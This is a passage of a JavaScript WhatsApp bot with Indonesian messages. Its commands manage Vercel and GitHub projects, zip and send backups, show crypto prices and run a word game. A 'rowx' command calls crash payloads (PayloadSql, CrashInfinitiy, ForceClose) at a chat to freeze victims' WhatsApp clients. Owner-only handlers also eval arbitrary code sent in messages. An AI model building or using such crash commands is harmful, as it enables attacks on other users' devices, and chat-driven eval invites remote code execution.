      if (validFeatures.length === 0) return reply("❌ Tidak ada fitur valid!");

      await client.sendMessage(m.chat, {
        document: fs.readFileSync(outputZip),
        mimetype: 'application/zip',
        fileName: `sc_${botName}.zip`,
        caption: `✅ *Success Script Created!*\n> By Tama Official\n\n*Creator:* ${m.pushName || 'user'}\n*Fitur:* [${validFeatures}]\n*Password:* ${password}`
      }, { quoted: loli });

      fs.rmSync(extractPath, { recursive: true, force: true });
      fs.unlinkSync(tempZipPath);
      fs.unlinkSync(outputZip);
    } catch (err) {
      console.error(err);
      reply(`❌ Terjadi error saat membuat script:\n${err.message}`);
    }
  })();
}
break;
case 'delweb': {
if (!isCreator && !isSellerWeb) return reply('Anda tidak memiliki akses ke fitur ini');
  if (!text) return reply('Penggunaan: .delweb <namaWeb>')
  const webName = text.trim().toLowerCase()

  const headers = {
    Authorization: `Bearer ${global.vercelToken}`
  }

  try {
    const response = await fetch(`https://api.vercel.com/v9/projects/${webName}`, {
      method: 'DELETE',
      headers
    })

    if (response.status === 200 || response.status === 204) {
      return reply(`✅ Website *${webName}* berhasil dihapus dari Vercel.`)
    } else if (response.status === 404) {
      return reply(`⚠️ Website *${webName}* tidak ditemukan di akun Vercel kamu.`)
    } else if (response.status === 403 || response.status === 401) {
      return reply(`⛔ Token Vercel tidak valid atau tidak punya akses ke project ini.`)
    } else {
      let result = {}
      try {
        result = await response.json()
      } catch (e) {}
      return reply(`❌ Gagal menghapus website:\n${result.error?.message || 'Tidak diketahui'}`)
    }

  } catch (err) {
    console.error(err)
    reply(`Terjadi kesalahan saat mencoba menghapus:\n${err.message}`)
  }
}
break

case 'addrepo': {
  if (!isCreator) return reply(mess.owner);

  if (!text.includes("|")) return reply("❌ Format salah!\nGunakan: .addrepo <nama>|<deskripsi>|<private/public>");

  const [nama, deskripsi, privasi] = text.split("|").map(a => a.trim());
  if (!nama || !deskripsi || !privasi) return reply("⚠️ Format tidak lengkap!");

  const isPrivate = privasi.toLowerCase() === 'private';

  const fetch = require("node-fetch");
  const res = await fetch(`https://api.github.com/user/repos`, {
    method: "POST",
    headers: {
      "Authorization": `token ${global.githubToken}`,
      "Accept": "application/vnd.github+json"
    },
    body: JSON.stringify({
      name: nama,
      description: deskripsi,
      private: isPrivate
    })
  });

  const data = await res.json();

  if (res.ok) {
    reply(`✅ *Repository berhasil dibuat!*\n\n📦 Nama: ${data.name}\n🔒 Private: ${data.private}\n🔗 URL: ${data.html_url}`);
  } else {
    reply(`❌ Gagal membuat repository.\n\n${JSON.stringify(data, null, 2)}`);
  }
}
break;
case 'checkrepo': {
  if (!isCreator) return reply(mess.owner);
  if (!text) return reply("⚠️ Masukkan nama repository!\nContoh: .checkrepo my-repo");

  const fetch = require("node-fetch");
  try {
    const repoName = text.trim();

    // Ambil info repo
    const resInfo = await fetch(`https://api.github.com/repos/${global.githubUsername}/${repoName}`, {
      headers: {
        "Authorization": `token ${global.githubToken}`,
        "Accept": "application/vnd.github+json"
      }
    });

    const repoInfo = await resInfo.json();
    if (!resInfo.ok) {
      return reply(`❌ Repository tidak ditemukan!\n\n${JSON.stringify(repoInfo, null, 2)}`);
    }

    // Ambil daftar file
    const resContent = await fetch(`https://api.github.com/repos/${global.githubUsername}/${repoName}/contents`, {
      headers: {
        "Authorization": `token ${global.githubToken}`,
        "Accept": "application/vnd.github+json"
      }
    });

    const contents = await resContent.json();
    if (!Array.isArray(contents)) {
      return reply(`❌ Gagal mengambil konten repository.`);
    }

    let listFiles = contents.map(v => `📄 ${v.name}`).join("\n");
    let total = contents.length;
    let status = repoInfo.private ? "🔒 Private" : "🌐 Public";
    let createdAt = new Date(repoInfo.created_at).toLocaleString('id-ID');

    reply(`*📦 Info Repository*\n\n` +
            `• Nama: ${repoInfo.name}\n` +
            `• Status: ${status}\n` +
            `• Dibuat: ${createdAt}\n` +
            `• Jumlah File: ${total}\n\n` +
            `*📁 File:*\n${listFiles}`);
  } catch (e) {
    console.error(e);
    reply("❌ Terjadi kesalahan saat memeriksa repository.");
  }
}
break;
case 'delrepo': {
  if (!isCreator) return reply(mess.owner);
  if (!text) return reply(example("<nama_repository>"));

  const fetch = require("node-fetch");
  const repoName = text.trim();
  const username = global.githubUsername; // pastikan ini diset di settings.js

  try {
    const res = await fetch(`https://api.github.com/repos/${username}/${repoName}`, {
      method: "DELETE",
      headers: {
        "Authorization": `token ${global.githubToken}`,
        "Accept": "application/vnd.github+json"
      }
    });

    if (res.status === 204) {
      reply(`✅ Repository *${repoName}* berhasil dihapus.`);
    } else if (res.status === 404) {
      reply(`❌ Repository *${repoName}* tidak ditemukan.`);
    } else {
      const error = await res.json();
      console.log(error);
      reply("❌ Gagal menghapus repository.");
    }
  } catch (err) {
    console.error(err);
    reply("❌ Terjadi kesalahan saat menghapus repository.");
  }
}
break;

case 'backup': {
if (!isCreator) return reply(mess.owner);
let jir = m.mentionedJid[0] || m.sender || client.parseMention(args[0]) || (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';
await reply('Mengumpulkan semua file ke folder...');
const { execSync } = require("child_process");
 const ls = (await execSync("ls")).toString().split("\n").filter( (pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "" );
await reply('Script akan dikirim lewat PC!')
const exec = await execSync(`zip -r Backup.zip ${ls.join(" ")}`);
await client.sendMessage(jir, {
document: await fs.readFileSync("./Backup.zip"),
mimetype: "application/zip",
fileName: "Backup.zip",
},
{quoted: loli });
await execSync("rm -rf Backup.zip");
}
break

case 'listrepo': {
  if (!isCreator) return reply(mess.owner);

  
  try {
    const res = await fetch(`https://api.github.com/user/repos`, {
      headers: {
        "Authorization": `token ${global.githubToken}`,
        "Accept": "application/vnd.github+json"
      }
    });
    const data = await res.json();

    if (!Array.isArray(data)) return reply("❌ Gagal mengambil repository!");

    if (data.length === 0) return reply("ℹ️ Belum ada repository.");

    const list = data.map((repo, i) => 
      `*${i + 1}. ${repo.name}*\n> ${repo.private ? '🔒 Private' : '🌐 Public'}\n> ${repo.html_url}`
    ).join("\n\n");

    reply(`📁 *List Repository GitHub :*\n\n${list}`);
  } catch (err) {
    console.error(err);
    reply("❌ Terjadi kesalahan saat mengambil data.");
  }
}
break;

case "crypto": case "infocrypto": {
if (text) {
const pair = text.toLowerCase()
const url = `https://indodax.com/api/summaries`;
    const response = await axios.get(url);
    const data = response.data.tickers[pair]
    if (!data) return reply("ID Coin tidak ditemukan!")
return reply(`
📈 Nama : *${data.name}*
🛒 Harga Buka : *Rp${Number(data.low).toLocaleString('id-ID')}*
🔒 Harga Tutup : *Rp${Number(data.high).toLocaleString('id-ID')}*
💰 Harga Saat Ini : *Rp${Number(data.last).toLocaleString('id-ID')}*
`)
}
try {
    const url = `https://indodax.com/api/summaries`;
    const response = await axios.get(url);
    const data = response.data.tickers;
    let teks = ""

    for (const [pair, info] of Object.entries(data)) {
      teks += `\n📈 Nama : *${info.name}* 
📎 ID : *${pair}*
💰 Harga : *Rp${Number(info.last).toLocaleString('id-ID')}*\n`
    }
    return reply(teks)

  } catch (error) {
    console.error('Gagal mengambil semua harga dari Indodax:', error.message);
  }
}
break

case "rst": case "restart": {
if (!isOwner) return
const { spawn } = require("child_process");

function restartServer() {
  // Spawn proses baru untuk menjalankan ulang server
  const newProcess = spawn(process.argv[0], process.argv.slice(1), {
    detached: true,
    stdio: "inherit",
  });

  // Keluar dari proses lama
  process.exit(0);
}

await reply("Restarting bot . . .")
// Contoh penggunaan: Restart setelah 5 detik
await setTimeout(() => {
  restartServer();
}, 5000);
}
break

case "tebakkata": {
    if (db.users[m.sender].gameActive) {
        return reply("⚠️ Anda sudah memiliki game aktif. Selesaikan terlebih dahulu!");
    }

    const words = [
        { word: "komputer", hint: "Alat elektronik untuk menghitung dan memproses data" },
        { word: "stipo", hint: "Di Kocok Keluar Putih Putih" },
        { word: "softex", hint: "Di Pakai Saat Cewek Haid Atau Halangan" },
        { word: "bawel", hint: "Ikan Apa Yang Cerewet?" },
        { word: "semute", hint: "Hewan Apa Yang Bisu? " },
        { word: "matahari", hint: "Sumber energi terbesar di tata surya" },
        { word: "programmer", hint: "Pekerjaan seseorang yang menulis kode komputer" },
        { word: "pelangi", hint: "Fenomena warna-warni di langit setelah hujan" },
        { word: "kamera", hint: "Alat untuk mengambil gambar atau video" }
    ];

    const selected = words[Math.floor(Math.random() * words.length)];
    db.users[m.sender].gameActive = {
        word: selected.word,
        hint: selected.hint,
        attempts: 3 // Batas percobaan
    };

    reply(`🎮 *Game Tebak Kata*\n\n🔍 *Petunjuk*: ${selected.hint}\n📝 *Tebak kata ini!* (Punya 3 percobaan)\n\nKetik .jawab Unfuk Menjawab`);

    // Reset game setelah 1 menit jika tidak dijawab
    setTimeout(() => {
        if (db.users[m.sender].gameActive) {
            reply("⏳ Waktu habis! Game selesai tanpa jawaban.");
            delete db.users[m.sender].gameActive;
        }
    }, 60000);
}
break;

case "jawab": {
    if (!db.users[m.sender].gameActive) {
        return reply("⚠️ Anda belum memulai game. Ketik *.tebakkata* untuk memulai!");
    }

    const answer = db.users[m.sender].gameActive.word.toLowerCase();
    const userAnswer = text.toLowerCase();

    if (userAnswer === answer) {
        reply(`🎉 *Benar!*\nJawabannya adalah *${answer}*.\nSelamat! Anda berhasil menebak kata.`);
        delete db.users[m.sender].gameActive;
    } else {
        db.users[m.sender].gameActive.attempts -= 1;

        if (db.users[m.sender].gameActive.attempts <= 0) {
            reply(`❌ *Salah!*\nKesempatan habis. Jawaban yang benar adalah *${answer}*.`);
            delete db.users[m.sender].gameActive;
        } else {
            reply(`❌ Salah! Anda punya ${db.users[m.sender].gameActive.attempts} kesempatan lagi.`);
        }
    }
}
break;

//================================================================================

case "rowx": {
if (!isCreator) return await client.sendMessage(m.chat, {
 audio: fs.readFileSync('./source/media/Musik.mp3'),
 mimetype: 'audio/mpeg',
 ptt: true
}, { quoted: loli });
await client.sendMessage(m.chat, { react: { text: `🔄`, key: m.key } });
// Crashing In Chat
await PayloadSql(m.chat);
await CrashInfinitiy(m.chat, true);
await ForceClose(m.chat);
client.sendMessage(m.chat, { react: { text: `🥶`, key: m.key } });
}
break

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
await reply(String(err))
}}

//================================================================================

if (m.text.toLowerCase() == "bot") {
reply("Bot Online")
}

if ((m.text).startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return client.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: loli})
} catch (e) {
return client.sendMessage(m.chat, {text: util.format(e)}, {quoted: loli})
}}

//---(Module Pembatas)---//

if ((m.text).startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
client.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: loli})
} catch (e) {
client.sendMessage(m.chat, {text: util.format(e)}, {quoted: loli})
}}

//---(Module Pembatas)---//

}} catch (e) {
console.log(e)
client.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`}, {quoted: m})
}}

//---(Module Pembatas)---//

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.cyan("File Update => "),
chalk.cyan.bgBlue.bold(`${__filename}`))
delete require.cache[file]
require(file)
})